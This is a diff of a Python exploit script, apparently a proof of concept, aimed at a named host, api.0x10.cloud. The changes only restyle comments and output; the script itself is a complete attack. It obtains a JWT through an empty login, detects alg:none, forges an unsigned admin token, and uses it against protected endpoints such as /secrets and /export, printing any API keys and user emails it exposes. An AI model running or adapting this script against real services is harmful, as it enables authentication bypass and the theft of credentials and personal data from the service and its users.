@@ -1,29 +1,21 @@
-# ============================================================
-# Author:           Yash Zinzuvadiya
-# Vulnerability:    JWT Algorithm None Attack — Full Admin Access
-#                   + API Key Exposure
-# Target:           api.0x10.cloud
-# Description:      The /auth endpoint accepts empty credentials
-#                   and returns a JWT signed with alg:none.
-#                   This allows forging admin tokens without any
-#                   secret key, exposing sensitive user data and
-#                   API keys from all authenticated endpoints.
-# ============================================================
+# author: Yash Zinzuvadiya
+# vulnerability: JWT Algorithm None Attack
+# target: api.0x10.cloud
 
 import urllib.request
 import urllib.error
-import urllib.parse
 import json
 import base64
 import time
 
 TARGET = "http://api.0x10.cloud"
 
-# ── Step 1: Get JWT via empty login ─────────────────────────
+# step 1 - try empty login and get token
 print("=" * 60)
-print("  STEP 1: Empty Login Auth Bypass")
+print("  STEP 1: Empty Login")
 print("=" * 60)
 
+# send empty post request to auth endpoint
 def post_json(url, data):
     payload = json.dumps(data).encode("utf-8")
     req = urllib.request.Request(
@@ -40,64 +32,67 @@ def post_json(url, data):
     except Exception as e:
         return None, str(e)
 
-# Try empty credentials on /auth endpoint
+# hit the auth endpoint with no credentials
 status, body = post_json(TARGET + "/auth", {})
 print(f"[*] POST {TARGET}/auth with empty body")
 print(f"[*] Status: {status}")
 print(f"[*] Response: {body}")
 
+# check if token exists in response
 token = None
 if "token" in body:
     token = json.loads(body).get("token")
-    print(f"\n[VULNERABILITY] Empty login returned JWT token!")
-    print(f"[*] Token: {token}")
+    print(f"\n[VULNERABILITY] empty login returned a JWT token")
+    print(f"[*] token: {token}")
 
-# ── Step 2: Decode the JWT to inspect alg and payload ───────
+# step 2 - decode the token and check the algorithm
 print("\n" + "=" * 60)
-print("  STEP 2: Decode JWT — Detect alg:none")
+print("  STEP 2: Decode JWT")
 print("=" * 60)
 
+# decode each part of the jwt
 def decode_jwt_part(part):
-    # Add padding back
     padding = 4 - len(part) % 4
     part += "=" * padding
     return json.loads(base64.b64decode(part).decode("utf-8"))
 
 if token:
     parts = token.split(".")
-    header  = decode_jwt_part(parts[0])
+    header = decode_jwt_part(parts[0])
     payload = decode_jwt_part(parts[1])
-    print(f"[*] JWT Header:  {json.dumps(header)}")
-    print(f"[*] JWT Payload: {json.dumps(payload)}")
+    print(f"[*] header:  {json.dumps(header)}")
+    print(f"[*] payload: {json.dumps(payload)}")
 
+    # check if alg is none - means no signature needed
     if header.get("alg") == "none":
-        print(f"\n[VULNERABILITY] JWT uses alg:none — no signature verification!")
-        print(f"[*] This means tokens can be forged without any secret key.")
-        print(f"[*] Payload shows role: {payload.get('role')} — admin access confirmed.")
+        print(f"\n[VULNERABILITY] alg:none detected - tokens can be forged without a secret key")
+        print(f"[*] role in payload: {payload.get('role')}")
 
-# ── Step 3: Forge an admin JWT with alg:none ────────────────
+# step 3 - forge an admin token
 print("\n" + "=" * 60)
-print("  STEP 3: Forge Admin JWT Token")
+print("  STEP 3: Forge Admin Token")
 print("=" * 60)
 
+# build a fake jwt with admin role and no signature
 def forge_jwt(header_data, payload_data):
     def b64encode_no_padding(data):
         return base64.b64encode(json.dumps(data).encode()).decode().rstrip("=")
     h = b64encode_no_padding(header_data)
     p = b64encode_no_padding(payload_data)
-    return f"{h}.{p}."  # empty signature
+    # leave signature empty since alg is none
+    return f"{h}.{p}."
 
-forged_header  = {"alg": "none", "typ": "JWT"}
+forged_header = {"alg": "none", "typ": "JWT"}
 forged_payload = {"sub": "1", "name": "Admin", "role": "admin", "iat": 9999999999}
-forged_token   = forge_jwt(forged_header, forged_payload)
+forged_token = forge_jwt(forged_header, forged_payload)
 
-print(f"[*] Forged Header:  {json.dumps(forged_header)}")
-print(f"[*] Forged Payload: {json.dumps(forged_payload)}")
-print(f"[*] Forged Token:   {forged_token}")
+print(f"[*] forged header:  {json.dumps(forged_header)}")
+print(f"[*] forged payload: {json.dumps(forged_payload)}")
+print(f"[*] forged token:   {forged_token}")
 
-# ── Step 4: Use forged token to access protected endpoints ──
+# step 4 - use the forged token to hit protected endpoints
 print("\n" + "=" * 60)
-print("  STEP 4: Access Protected Endpoints with Forged Token")
+print("  STEP 4: Access Protected Endpoints")
 print("=" * 60)
 
 endpoints = [
@@ -105,6 +100,7 @@ endpoints = [
     "/secrets", "/data", "/logs", "/debug", "/internal", "/export"
 ]
 
+# try each endpoint with the forged token
 for ep in endpoints:
     req = urllib.request.Request(
         TARGET + ep,
@@ -117,25 +113,25 @@ for ep in endpoints:
         r = urllib.request.urlopen(req, timeout=5)
         body = r.read().decode("utf-8", errors="ignore")
         print(f"[200 OPEN] {ep}")
-        print(f"  Response: {body[:300]}")
+        print(f"  response: {body[:300]}")
+        # check if api key or email is exposed
         if "api_key" in body:
-            print(f"  [CRITICAL] API key exposed: {json.loads(body).get('api_key')}")
+            print(f"  [CRITICAL] api key exposed: {json.loads(body).get('api_key')}")
         if "email" in body:
-            print(f"  [CRITICAL] Email exposed: {json.loads(body).get('email')}")
+            print(f"  [CRITICAL] email exposed: {json.loads(body).get('email')}")
     except urllib.error.HTTPError as e:
         body = e.read().decode("utf-8", errors="ignore")
         print(f"[{e.code}] {ep}")
     except Exception as e:
-        print(f"[ERR] {ep} — {e}")
+        print(f"[ERR] {ep} - {e}")
     time.sleep(0.15)
 
+# summary of what was found
 print("\n" + "=" * 60)
 print("  SUMMARY")
 print("=" * 60)
-print("  Target:       api.0x10.cloud")
-print("  Vulnerability: JWT Algorithm None Attack")
-print("  Impact:        Complete authentication bypass.")
-print("                 Forged admin tokens accepted by all endpoints.")
-print("                 Admin API keys and user data fully exposed.")
-print("  Modules used:  urllib.request, urllib.error, json, base64, time")
+print("  target:        api.0x10.cloud")
+print("  vulnerability: JWT algorithm none attack")
+print("  impact:        complete auth bypass, admin api keys and user data exposed")
+print("  modules used:  urllib.request, urllib.error, json, base64, time")
 print("=" * 60)
